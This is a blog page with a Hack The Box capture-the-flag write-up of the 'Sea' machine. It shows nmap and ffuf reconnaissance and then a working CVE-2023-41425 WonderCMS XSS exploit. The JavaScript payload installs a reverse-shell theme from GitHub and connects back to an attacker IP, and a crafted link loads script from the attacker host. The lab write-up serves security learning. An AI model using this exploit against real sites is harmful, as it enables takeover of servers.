<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Sea - Hack The Box Machines" />
<meta property="og:locale" content="en" />
<meta name="description" content="DigitalDenCloud - Documentation and More" />
<meta property="og:description" content="DigitalDenCloud - Documentation and More" />
<link rel="canonical" href="http://localhost:4000/posts/Sea-Hack-The-Box-Machine/" />
<meta property="og:url" content="http://localhost:4000/posts/Sea-Hack-The-Box-Machine/" />
<meta property="og:site_name" content="Natsu" />
<meta property="og:image" content="http://localhost:4000/assets/img/posts/htb/htb.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-08-16T08:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/posts/htb/htb.png" />
<meta property="twitter:title" content="Sea - Hack The Box Machines" />
<meta name="twitter:site" content="@twitter_username" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-19T14:25:13+01:00","datePublished":"2024-08-16T08:00:00+01:00","description":"DigitalDenCloud - Documentation and More","headline":"Sea - Hack The Box Machines","image":"http://localhost:4000/assets/img/posts/htb/htb.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Sea-Hack-The-Box-Machine/"},"url":"http://localhost:4000/posts/Sea-Hack-The-Box-Machine/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Sea - Hack The Box Machines | Natsu
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Natsu">
<meta name="application-name" content="Natsu">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    
      <link rel="preconnect" href="https://cdnjs.cloudflare.com" >
      <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>

    
</head>
  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/headers/avata.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">Natsu</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Security Engineer | Blue Team</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://www.youtube.com/"
          aria-label="youtube"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-youtube"></i>
        </a>
      
    
      

      
        <a
          href="https://www.linkedin.com/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
      

      
        <a
          href="https://github.com/Natsu.yzx"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://gmail.com"
          aria-label=""
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Sea - Hack The Box Machines</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Sea - Hack The Box Machines</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1723791600"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 16, 2024
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1726752313"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Sep 19, 2024
</time>

        </span>
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/posts/htb/htb.png" class="popup img-link preview-img shimmer"><img src="/assets/img/posts/htb/htb.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/username">Natsu.2013</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1274 words"
>
  <em>7 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p><a href="/assets/img/posts/htb/sea/Sea.png" class="popup img-link  shimmer"><img src="/assets/img/posts/htb/sea/Sea.png" alt="Sea" width="972" height="589" loading="lazy"></a></p>

<h2 id="reconnaisance"><span class="me-2">Reconnaisance</span><a href="#reconnaisance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Hello, you guys! 👋 Welcome back. This is the second machine challenge of <code class="language-plaintext highlighter-rouge">Season VI</code>. As with many previous attempts to pwn a box, I will start off by scanning the IP address to see what ports are open. Let’s do it with NMAP tool:</p>

<div class="language-bash nolineno highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-p-</span> 10.10.x.x <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nt">-oN</span> nmapscan <span class="nt">-Pn</span> <span class="nt">--disable-arp-ping</span>
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-08-17 06:59 CEST
Warning: 10.10.x.x giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>sea.htb <span class="o">(</span>10.10.x.x<span class="o">)</span>
Host is up <span class="o">(</span>0.027s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 64391 closed ports, 1142 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>107.97 seconds

</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash nolineno highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>nmapscan | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s1">'^[0-9]'</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-p</span><span class="nv">$ports</span> 10.10.x.x

Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-08-17 07:39 CEST
Nmap scan report <span class="k">for </span>sea.htb <span class="o">(</span>10.10.x.x<span class="o">)</span>
Host is up <span class="o">(</span>0.023s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not <span class="nb">set</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Sea - Home
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>8.71 seconds

</pre></td></tr></tbody></table></code></div></div>

<p>And I got two ports open 22 for SSH and 80 for HTTP. 
I need to add the IP address of the machine to my hosts file:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'10.10.1x.x sea.htb'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span>  /etc/hosts
</pre></td></tr></tbody></table></code></div></div>

<p>Next, lets go and visit <code class="language-plaintext highlighter-rouge">http://sea.htb</code>:</p>

<p><a href="/assets/img/posts/htb/sea/1i1LthjrQ4.png" class="popup img-link  shimmer"><img src="/assets/img/posts/htb/sea/1i1LthjrQ4.png" alt="Desktop View" width="972" height="589" loading="lazy"></a></p>

<p>Well, the homepage didn’t have anything interesting, but I found the contact form when I clicked on <code class="language-plaintext highlighter-rouge">How to Practice</code>.</p>

<p><a href="/assets/img/posts/htb/sea/CUDmGSPQtv.png" class="popup img-link  shimmer"><img src="/assets/img/posts/htb/sea/CUDmGSPQtv.png" alt="Contact form" width="972" height="589" loading="lazy"></a></p>

<p>The first thing that comes up in my mine when I saw input field is XSS or SQLi, or SSRF in website field, but it didn’t work.</p>

<p>I tried to find sub-directories with <code class="language-plaintext highlighter-rouge">ffuf</code>:</p>

<div class="language-bash nolineno highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://sea.htb/FUZZ <span class="nt">-w</span> ~/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt <span class="nt">-fs</span> 199

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/FUZZ
 :: Wordlist         : FUZZ: /home/natsu/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 199
________________________________________________

data                    [Status: 301, Size: 228, Words: 14, Lines: 8]
home                    [Status: 200, Size: 3649, Words: 582, Lines: 87]
404                     [Status: 200, Size: 3340, Words: 530, Lines: 85]
messages                [Status: 301, Size: 232, Words: 14, Lines: 8]
plugins                 [Status: 301, Size: 231, Words: 14, Lines: 8]
themes                  [Status: 301, Size: 230, Words: 14, Lines: 8]
0                       [Status: 200, Size: 3649, Words: 582, Lines: 87]
                        [Status: 200, Size: 3649, Words: 582, Lines: 87]

</span></pre></td></tr></tbody></table></code></div></div>

<div class="language-bash nolineno highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://sea.htb/themes/FUZZ <span class="nt">-w</span> ~/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt <span class="nt">-fs</span> 199

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/themes/FUZZ
 :: Wordlist         : FUZZ: /home/natsu/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 199
________________________________________________

home                    [Status: 200, Size: 3649, Words: 582, Lines: 87]
404                     [Status: 200, Size: 3340, Words: 530, Lines: 85]
bike                    [Status: 301, Size: 235, Words: 14, Lines: 8]
</span></pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/posts/htb/sea/xydb0s6md6.png" class="popup img-link  shimmer"><img src="/assets/img/posts/htb/sea/xydb0s6md6.png" alt="Readme.md" width="972" height="589" loading="lazy"></a></p>

<h2 id="gain-access-www-data"><span class="me-2">Gain access www-data</span><a href="#gain-access-www-data" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I already got the exploit: <a href="https://github.com/prodigiousMind/CVE-2023-41425">CVE-2023-41425</a></p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://sea.htb/index.php/?page=loginURL</span><span class="dl">"</span><span class="p">;</span>
<span class="k">if </span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nf">endsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
 <span class="nx">url</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">urlWithoutLog</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">).</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">urlWithoutLogBase</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URL</span><span class="p">(</span><span class="nx">urlWithoutLog</span><span class="p">).</span><span class="nx">pathname</span><span class="p">;</span> 
<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">[name="token"]</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">urlRev</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://sea.htb/index.php</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&amp;directoryName=violet&amp;type=themes&amp;token=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">token</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">xhr3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">xhr3</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nx">xhr3</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">urlRev</span><span class="p">);</span>
<span class="nx">xhr3</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="nx">xhr3</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
 <span class="k">if </span><span class="p">(</span><span class="nx">xhr3</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
   <span class="kd">var</span> <span class="nx">xhr4</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
   <span class="nx">xhr4</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
   <span class="nx">xhr4</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://sea.htb/themes/revshell-main/rev.php</span><span class="dl">"</span><span class="p">);</span>
   <span class="nx">xhr4</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
   <span class="nx">xhr4</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
     <span class="k">if </span><span class="p">(</span><span class="nx">xhr4</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
       <span class="kd">var</span> <span class="nx">ip</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">10.10.14.11</span><span class="dl">"</span><span class="p">;</span>
       <span class="kd">var</span> <span class="nx">port</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">9001</span><span class="dl">"</span><span class="p">;</span>
       <span class="kd">var</span> <span class="nx">xhr5</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
       <span class="nx">xhr5</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
       <span class="nx">xhr5</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.11&amp;lport=9001</span><span class="dl">"</span><span class="p">);</span>
       <span class="nx">xhr5</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
       
     <span class="p">}</span>
   <span class="p">};</span>
 <span class="p">}</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Send this link to Admin:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://sea.htb/wondercms/index.php?page=loginURL?"&gt;&lt;/form&gt;&lt;script+src="http://10.10.14.117:9901/xss.js"&gt;&lt;/script&gt;&lt;form+action="
</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/posts/htb/sea/qdOjmu4Tur.png" class="popup img-link  shimmer"><img src="/assets/img/posts/htb/sea/qdOjmu4Tur.png" alt="XSS" loading="lazy"></a></p>

<p>Boom, I got reverse shell … 
